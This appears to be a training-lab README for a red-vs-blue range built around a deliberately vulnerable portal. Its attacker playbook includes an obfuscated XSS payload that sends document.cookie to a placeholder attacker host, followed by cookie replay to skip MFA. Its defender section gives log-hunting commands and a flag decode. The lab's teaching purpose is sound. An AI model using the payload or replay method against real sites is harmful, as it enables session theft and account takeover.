Project Aether-Shield: Active Session Hijacking & Forensics Telemetry Range
Focus: Defensive Infrastructure Engineering & Session Replay Forensic Hunting
Platform Architecture: Proxmox VE / Ubuntu Server Base Layer

1. Project Overview & Operational Context
In modern cloud environments, session token tracking mechanisms are a high-value vector for advanced threat actors. Traditional defensive systems often fail to intercept Pass-the-Cookie / Session Hijacking attacks once an active verification token has been established.
Project Aether-Shield is a self-contained "Red vs. Blue" simulation lab. It deploys an intentionally vulnerable corporate Operations Portal that models how flaws in validation architectures can allow attackers to steal session data via Cross-Site Scripting (XSS) and bypass Multi-Factor Authentication (MFA) via Session Replay.
Simultaneously, the platform routes edge traffic through Nginx configured for SIEM-Ready JSON Logging. This generates deep, structured telemetry, creating a realistic forensic trace of the attack lifecycle for Blue Team hunting and incident analysis.

       [ Attacker / Recon Traffic ]
                    │
                    ▼ (TCP Port 80)
   ┌────────────────────────────────┐
   │       Nginx Edge Proxy         │ ───► Generates Structured
   │     (Reverse Proxy Host)       │      JSON logs for SIEM (ELK/Splunk)
   └────────────────────────────────┘
                    │
                    ▼ (Docker Internal Network Bridge)
   ┌────────────────────────────────┐
   │      Aether Core Service       │ ───► Vulnerable Cookie Storage
   │     (Node.js App Container)    │      & Minimalist Signature WAF
   └────────────────────────────────┘


3. Infrastructure Sizing & Provisioning Blueprint
Deploy this lab environment inside a dedicated, isolated hypervisor node (VirtualBox or Proxmox VE) using these system specifications:
Operating System: Ubuntu Server 24.04 LTS or Debian 12 Minimal
Processor (vCPUs): 2 Cores (Intel VT-x/AMD-V virtualization enabled)
RAM Allocation: 2 GB (2048 MB)
Storage Allocation: 20 GB Dynamically Allocated Disk Space
Network Adapter: Bridged Device (vmbr0 inside Proxmox or Bridge Adapter in VirtualBox)
Zero-Touch Orchestration Setup
To automatically deploy the system dependencies, container configs, secure network sockets, and telemetry scripts, clone the repository and run:
chmod +x deploy-enterprise-range.sh
sudo ./deploy-enterprise-range.sh


4. Red Team Playbook: The Compromise Chain
The attack path illustrates the progression from initial discovery to administrative session replay.
Step 1: Reconnaissance (Web Surface Profiling)
Scanning the public platform surfaces exposes explicit technology configurations.
curl -I http://<LAB_TARGET_IP>/


Vulnerable Artifacts: The response headers expose customized backend signatures (X-Platform-Engine: Aether-Core-V2), and the standard path index leaks restricted routes in robots.txt pointing to administrative sub-consoles and verification layers.
Step 2: Exploitation (XSS to Token Extraction)
The target application is vulnerable to persistent or reflected script injection through its diagnostic reporting gateway.
The attacker submits a bypass payload leveraging HTML5 elements with inline event handlers to slip past the rudimentary signature-based WAF:
<svg onload="fetch('http://<ATTACKER_IP>/collect?cookie='+window['docu'+'ment']['coo'+'kie'])">


Because the session tracker token (aether_session_state) has the HttpOnly security flag set to False, the executing script successfully steals the active user's session state.
Step 3: MFA Bypass (Active Session Replay)
Having captured the active administrative token (aether_sess_admin_x9812y3d), the attacker replays the cookie directly using a proxy tool or developer console.
The core gateway skips the MFA validation checkpoint (/api/v1/auth/mfa-handshake) because it assumes the inbound request is already validated, giving the attacker access to the internal /console/dashboard.
4. Blue Team Playbook: Forensics Threat Hunting
This lab includes mock telemetry designed to mirror real cloud environments where data is ingested by SIEM platforms (like Elasticsearch, Splunk, or Wazuh).
Analyst Hunting Checklist
[ ] Identify Multi-Location Session Abuse: Locate events where a single token is claimed by non-adjacent IP subnets (e.g., 192.168.1.100 and 10.10.14.50).
[ ] Decode Exfiltrated Tokens: Extract base64 parameters captured during anomaly intervals to uncover core system indicator keys.
[ ] Pinpoint Security Severity Alarms: Isolate critical system-level warning metrics triggered inside siem_error.log.
[ ] Analyze Bypass Anomaly Timestamps: Verify specific system alerts fired at 08:53:10 indicating anomalous session validation processes.
Forensic Investigation CLI Snippets
Run these terminal commands within the host directory to analyze raw telemetry:
1. Querying Structured JSON Logs for Cookie Reuse Anomalies:
cat /opt/aether-shield/telemetry/siem_access.json | jq -r 'select(.request_uri=="/console/dashboard") | {time: .timestamp, ip: .client_ip, cookie: .session_cookie}'


Expected Forensic Signature:
Shows the exact session token being requested by a local address, and then immediately claimed by external subnet 10.10.14.50 inside a narrow timeframe.
2. Filtering High-Severity Platform Errors:
grep "SECURITY_CRITICAL" /opt/aether-shield/telemetry/siem_error.log


Expected Forensic Output:
2026/07/05 08:53:10 [crit] 42#42: *18 SECURITY_CRITICAL Anomaly: Session Hijacking Detected...


3. Decoding Recovered Network Exfiltration Flags:
Locate the base64 payload parameter captured inside the X-Forwarded-For header string, and execute standard translation filters to extract the underlying flag token:
echo "QUVUSEVSX1NJRU1fTE9HX0ZPUkVOU0lDU19NQVNURVI=" | base64 -d


Decoded Value:
AETHER_SIEM_LOG_FORENSICS_MASTER
